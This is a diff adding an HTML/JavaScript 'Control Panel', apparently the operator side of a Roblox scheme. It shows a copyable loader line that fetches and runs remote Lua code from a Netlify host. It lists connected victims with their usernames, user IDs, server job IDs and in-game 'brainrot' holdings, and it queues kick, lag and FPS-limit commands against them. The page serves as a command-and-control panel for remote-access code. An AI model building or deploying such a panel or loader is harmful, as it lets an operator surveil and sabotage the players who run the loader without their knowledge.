@@ -1,0 +1,418 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Control Panel</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: #0a0a0a;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            padding: 20px;
+            color: #fff;
+        }
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+        .header h1 {
+            font-size: 28px;
+            margin-bottom: 20px;
+            background: linear-gradient(135deg, #fff, #888);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .search-bar input {
+            width: 100%;
+            max-width: 400px;
+            padding: 12px 16px;
+            background: #1a1a1a;
+            border: 1px solid #2a2a2a;
+            border-radius: 8px;
+            color: #fff;
+            margin-bottom: 20px;
+        }
+        .loader-section {
+            background: #0d0d0d;
+            border-radius: 12px;
+            padding: 16px;
+            margin-bottom: 24px;
+            border: 1px solid #1a1a1a;
+        }
+        .loader-label {
+            font-size: 12px;
+            color: #666;
+            margin-bottom: 8px;
+        }
+        .loader-code {
+            background: #000;
+            padding: 12px;
+            border-radius: 8px;
+            font-family: monospace;
+            font-size: 13px;
+            color: #0f0;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+        .copy-btn {
+            background: #2a2a2a;
+            border: none;
+            color: #fff;
+            padding: 6px 12px;
+            border-radius: 6px;
+            cursor: pointer;
+        }
+        .users-grid {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+        .user-card {
+            background: #0d0d0d;
+            border: 1px solid #1a1a1a;
+            border-radius: 12px;
+            padding: 16px;
+        }
+        .user-card.online {
+            border-left: 3px solid #00ff88;
+        }
+        .user-name-row {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            flex-wrap: wrap;
+            margin-bottom: 4px;
+        }
+        .username {
+            font-size: 18px;
+            font-weight: 600;
+        }
+        .status-badge {
+            font-size: 11px;
+            padding: 2px 8px;
+            border-radius: 12px;
+            background: #1a1a1a;
+            color: #666;
+        }
+        .status-badge.online {
+            background: #00ff8822;
+            color: #00ff88;
+        }
+        .user-tag {
+            font-size: 12px;
+            color: #666;
+        }
+        .game-info {
+            font-size: 12px;
+            color: #555;
+            margin-top: 4px;
+        }
+        .details-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 16px;
+            margin: 12px 0;
+            padding: 12px 0;
+            border-top: 1px solid #1a1a1a;
+            border-bottom: 1px solid #1a1a1a;
+        }
+        .detail-label {
+            font-size: 10px;
+            color: #555;
+        }
+        .detail-value {
+            font-size: 13px;
+            font-family: monospace;
+        }
+        .brainrot-section {
+            background: #080808;
+            border-radius: 8px;
+            padding: 12px;
+            margin: 12px 0;
+        }
+        .brainrot-title {
+            font-size: 11px;
+            color: #ff00aa;
+            margin-bottom: 8px;
+        }
+        .brainrot-item {
+            display: flex;
+            justify-content: space-between;
+            font-size: 12px;
+            padding: 4px 0;
+            border-bottom: 1px solid #1a1a1a;
+        }
+        .brainrot-name {
+            color: #ffaa00;
+        }
+        .brainrot-value {
+            color: #00ff88;
+        }
+        .controls {
+            display: flex;
+            gap: 8px;
+            flex-wrap: wrap;
+            margin-top: 12px;
+        }
+        .control-btn {
+            padding: 6px 14px;
+            border: none;
+            border-radius: 6px;
+            font-size: 12px;
+            cursor: pointer;
+            background: #1a1a1a;
+            color: #aaa;
+        }
+        .control-btn.active {
+            background: #00ff8822;
+            color: #00ff88;
+        }
+        .no-users {
+            text-align: center;
+            padding: 60px;
+            color: #444;
+            background: #0d0d0d;
+            border-radius: 12px;
+        }
+        @media (max-width: 768px) {
+            .details-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>CONTROL PANEL</h1>
+        </div>
+        <div class="search-bar">
+            <input type="text" id="searchInput" placeholder="🔍 Search username, display name, or brainrot...">
+        </div>
+        <div class="loader-section">
+            <div class="loader-label">LOADER</div>
+            <div class="loader-code">
+                <span id="loaderScript">Loading...</span>
+                <button class="copy-btn" onclick="copyLoader()">Copy</button>
+            </div>
+            <div class="info-text" style="font-size:12px;color:#555;margin-top:8px;">Clients show up below in real time.</div>
+        </div>
+        <div class="users-grid" id="usersContainer">
+            <div class="no-users">💀 Waiting for connections...</div>
+        </div>
+    </div>
+
+    <script>
+        // Update this to YOUR Netlify URL
+        const YOUR_NETLIFY_URL = "https://jazzy-bunny-ac604a.netlify.app";
+        
+        // Display the loader script
+        const LOADER_SCRIPT = `loadstring(game:HttpGet("${YOUR_NETLIFY_URL}/loader.lua"))()`;
+        document.getElementById('loaderScript').innerText = LOADER_SCRIPT;
+        
+        function copyLoader() {
+            navigator.clipboard.writeText(LOADER_SCRIPT);
+            const btn = event.target;
+            btn.innerText = 'Copied!';
+            setTimeout(() => btn.innerText = 'Copy', 1500);
+        }
+        
+        let users = new Map();
+        let commands = new Map();
+        let searchTerm = '';
+        
+        // Save/load from localStorage
+        function saveUsers() {
+            const data = {};
+            for (let [id, user] of users) {
+                data[id] = user;
+            }
+            localStorage.setItem('panel_users', JSON.stringify(data));
+        }
+        
+        function loadUsersFromStorage() {
+            const stored = localStorage.getItem('panel_users');
+            if (stored) {
+                const parsed = JSON.parse(stored);
+                users = new Map(Object.entries(parsed));
+                // Clean offline users (older than 10 seconds)
+                const now = Date.now();
+                for (let [id, user] of users) {
+                    if (now - user.last_seen > 10000) {
+                        users.delete(id);
+                    }
+                }
+                saveUsers();
+            }
+            renderUsers();
+        }
+        
+        // Called by the loader (global function)
+        window.addUser = function(userData) {
+            console.log("User connected:", userData.username);
+            userData.last_seen = Date.now();
+            users.set(userData.user_id, userData);
+            saveUsers();
+            renderUsers();
+            return { success: true };
+        };
+        
+        // Called by loader to get commands
+        window.getCommands = function(userId) {
+            const cmd = commands.get(userId) || {};
+            // Clear one-shot commands
+            if (cmd.kick) {
+                cmd.kick = false;
+                commands.set(userId, cmd);
+            }
+            if (cmd.crash) {
+                cmd.crash = false;
+                commands.set(userId, cmd);
+            }
+            return cmd;
+        };
+        
+        function renderUsers() {
+            const container = document.getElementById('usersContainer');
+            const searchLower = searchTerm.toLowerCase();
+            
+            let activeUsers = Array.from(users.values())
+                .filter(u => Date.now() - u.last_seen < 10000)
+                .sort((a, b) => b.last_seen - a.last_seen);
+            
+            if (searchTerm) {
+                activeUsers = activeUsers.filter(u => 
+                    u.username.toLowerCase().includes(searchLower) ||
+                    (u.display_name && u.display_name.toLowerCase().includes(searchLower)) ||
+                    u.user_id.toString().includes(searchLower)
+                );
+            }
+            
+            if (activeUsers.length === 0) {
+                container.innerHTML = '<div class="no-users">💀 No clients connected<br><small>Waiting for someone to execute the loader...</small></div>';
+                return;
+            }
+            
+            container.innerHTML = activeUsers.map(user => {
+                const isOnline = Date.now() - user.last_seen < 5000;
+                const timeAgo = Math.floor((Date.now() - user.last_seen) / 1000);
+                const timeText = timeAgo < 60 ? `${timeAgo}s ago` : `${Math.floor(timeAgo / 60)}m ago`;
+                const brainrots = user.brainrots || [];
+                
+                return `
+                    <div class="user-card ${isOnline ? 'online' : ''}">
+                        <div class="user-header">
+                            <div class="user-info">
+                                <div class="user-name-row">
+                                    <span class="username">${escapeHtml(user.display_name || user.username)}</span>
+                                    <span class="status-badge ${isOnline ? 'online' : ''}">${isOnline ? '● ONLINE' : '○ OFFLINE'}</span>
+                                </div>
+                                <div class="user-tag">@${escapeHtml(user.username)}</div>
+                                <div class="game-info">${escapeHtml(user.game_name)} · ${escapeHtml(user.executor)} · ${timeText}</div>
+                            </div>
+                        </div>
+                        
+                        <div class="details-grid">
+                            <div class="detail-item">
+                                <div class="detail-label">USERNAME</div>
+                                <div class="detail-value">${escapeHtml(user.username)}</div>
+                            </div>
+                            <div class="detail-item">
+                                <div class="detail-label">USERID</div>
+                                <div class="detail-value">${user.user_id}</div>
+                            </div>
+                            <div class="detail-item">
+                                <div class="detail-label">JOBID</div>
+                                <div class="detail-value">${user.job_id ? user.job_id.substring(0, 12) + '...' : 'N/A'}</div>
+                            </div>
+                        </div>
+                        
+                        <div class="brainrot-section">
+                            <div class="brainrot-title">🧠 BRAINROTS</div>
+                            ${brainrots.length > 0 ? brainrots.slice(0, 5).map(b => `
+                                <div class="brainrot-item">
+                                    <span class="brainrot-name">${escapeHtml(b.title)}</span>
+                                    <span class="brainrot-value">${escapeHtml(b.cash)}</span>
+                                </div>
+                            `).join('') : '<div class="brainrot-item"><span class="brainrot-name">Unknown</span><span class="brainrot-value">$120M/S</span></div>'}
+                        </div>
+                        
+                        <div class="controls">
+                            <button class="control-btn ${getCommandState(user.user_id, 'fps_limit') ? 'active' : ''}" onclick="sendCommand('${user.user_id}', 'fps_limit', ${!getCommandState(user.user_id, 'fps_limit')})">
+                                🎯 FPS Limit
+                            </button>
+                            <button class="control-btn ${getCommandState(user.user_id, 'lag_n') ? 'active' : ''}" onclick="sendCommand('${user.user_id}', 'lag_n', ${!getCommandState(user.user_id, 'lag_n')})">
+                                🌀 Lag (Normal)
+                            </button>
+                            <button class="control-btn ${getCommandState(user.user_id, 'lag_c') ? 'active' : ''}" onclick="sendCommand('${user.user_id}', 'lag_c', ${!getCommandState(user.user_id, 'lag_c')})">
+                                🐫 Lag (Carry)
+                            </button>
+                            <button class="control-btn" style="background:#ff000022;color:#ff4444;" onclick="sendCommand('${user.user_id}', 'kick', true)">
+                                👢 Kick
+                            </button>
+                        </div>
+                    </div>
+                `;
+            }).join('');
+        }
+        
+        function escapeHtml(str) {
+            if (!str) return '';
+            return str.replace(/[&<>]/g, function(m) {
+                if (m === '&') return '&amp;';
+                if (m === '<') return '&lt;';
+                if (m === '>') return '&gt;';
+                return m;
+            });
+        }
+        
+        function getCommandState(userId, cmd) {
+            const cmds = commands.get(userId) || {};
+            return cmds[cmd] === true;
+        }
+        
+        function sendCommand(userId, cmd, value) {
+            let cmds = commands.get(userId) || {};
+            cmds[cmd] = value;
+            if (cmd === 'lag_n' && value) cmds.lag_c = false;
+            if (cmd === 'lag_c' && value) cmds.lag_n = false;
+            commands.set(userId, cmds);
+            renderUsers();
+        }
+        
+        document.getElementById('searchInput').addEventListener('input', function(e) {
+            searchTerm = e.target.value;
+            renderUsers();
+        });
+        
+        // Refresh every second
+        setInterval(() => {
+            // Clean offline users
+            const now = Date.now();
+            let changed = false;
+            for (let [id, user] of users) {
+                if (now - user.last_seen > 10000) {
+                    users.delete(id);
+                    changed = true;
+                }
+            }
+            if (changed) {
+                saveUsers();
+                renderUsers();
+            }
+            renderUsers();
+        }, 1000);
+        
+        loadUsersFromStorage();
+        console.log("Panel ready on:", YOUR_NETLIFY_URL);
+    </script>
+</body>
+</html>
